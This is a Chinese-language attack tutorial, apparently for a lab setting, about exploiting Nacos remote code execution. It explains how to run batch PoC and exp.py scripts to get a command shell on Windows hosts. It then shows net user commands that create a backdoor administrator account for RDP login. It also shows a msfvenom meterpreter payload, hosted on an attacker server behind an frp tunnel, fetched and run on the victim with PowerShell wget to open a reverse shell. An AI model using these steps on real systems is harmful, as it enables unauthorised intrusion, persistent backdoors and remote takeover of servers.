Ⅲ、批量POC检测开发

PS:bp8080监听需要开启

首先我们利用压缩包中的service.py，将它上传到38.12.31.36的机器上，然后在上传到的目标文件夹输入python service.py启动服务

再利用压缩包中的nacos RCE漏洞POC.py

在压缩包目录下输入cmd然后按下回车

在cmd中输入python nacosRCE漏洞POC.py

按下回车会出现一个三角尖，在三角处粘贴url路径

按下回车后便会自行开启检测

此poc可以将windows和linux系统都检测到

Ⅳ、MSTSC远程桌面连接

当我们利用漏洞检测工具检测到windows主机时

我们便可以利用压缩包中的exp.py

在压缩包目录里输入python exp.py

按下回车会出现如下界面

这次我们需要输入url和端口号而不是ip地址例如http://x.x.x.x而不是直接输入ip x.x.x.x

按下回车便会进入command

Command是一个循环的shell，输入一条命令不会退出而是继续等待后一条命令

首先我们输入net user hello 123456 /add来添加新用户

命令成功完成

只添加用户是不能直接连接的还需要将刚刚的用户提权至管理员权限

输入net localgroup administrators hello /add完成提权

命令成功完成

接下来就按下win+r输入mstsc

输入刚刚的ip地址然后点击连接

然后输入刚刚创建的用户名和密码然后点击连接

然后选择是

然后咱们等待30秒

成功登陆

V、MSF反弹shell

首先我们需要一台公网服务器在服务器上搭建frp内网穿透工具

下载链接https://github.com/fatedier/frp/releases

我在windows服务器上使用的是frp_0.59.0_windows_amd64版本

在本地kali上使用的是frp_0.59.0_linux_amd64版本

首先我们需要配置服务器上的frp

将frp解压后打开

点开文件夹中的frps.toml

将文件内容进行修改成如下内容

[common]bind_port = 7000dashboard_port = 7500dashboard_user = "admin"dashboard_pwd = "admin"

保存后在文件夹上方地址栏输入cmd来打开命令行

然后在cmd中输入

frps.exe -c frps.toml

来启动frp

下图为启动成功时所显示的

然后打开我们kali把刚刚下载的linux版本的frp复制粘贴到kali里面，然后

再安装包所在目录输入

tar -zxvf frp_0.59.0_linux_amd64.tar.gz

进行解压

然后输入

cd frp_0.59.0_linux_amd64/

切换到解压后的frp文件夹

输入ls之后可以看到这么5个文件

接下来我们就需要修改frpc.toml的文件内容

输入

vim frpc.toml

来打开frpc.tomal

如下为详细配置

serverAddr = "你的服务器ip"serverPort = 7000[[proxies]]name = "test-tcp"type = "tcp"localIP = "127.0.0.1"localPort = 22remotePort = 6000[[proxies]]name = "msfserver"type = "tcp"localIP = "你的kali ip"localPort = 4001remotePort = 4001

接下来输入

./frpc -c frpc.toml

来运行frp客户端

接下来利用我们的msf来生成exe马子

输入

msfvenom -p windows/meterpreter/reverse_tcp lhost=你的服务器ip lport=4001 -f exe -o 1.exe

来生成马子

生成成功！

然后将我们的马子存到我们的服务器上

随便找一个文件夹存入

然后在地址栏上输入python -m http.server

按下回车便可以看到一个窗口即为成功开启http服务

然后去到我们的kali开启msf监听

命令行中键入msfconsole按下回车运行msf

对msf进行监听配置

启动后输入

use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 你的kaliipSet lport 4001Run

Run输入按下回车后开始监听

然后我们利用poc随机挑选一位幸运靶场来作为我们msf的嘉宾

检测完后打开我们的exp.py

在地址栏输入

python exp.py

按下回车来运行他

将我们的嘉宾放到上面（注意一定要是http://x.x.x.x的形式）

按下回车进入command在command中输入:powershell wget -o ./1.exe http://{你的服务器}:8000/1.exe然后再输入powershell ./1.exe

然后第二个回应包会卡住

成功反弹
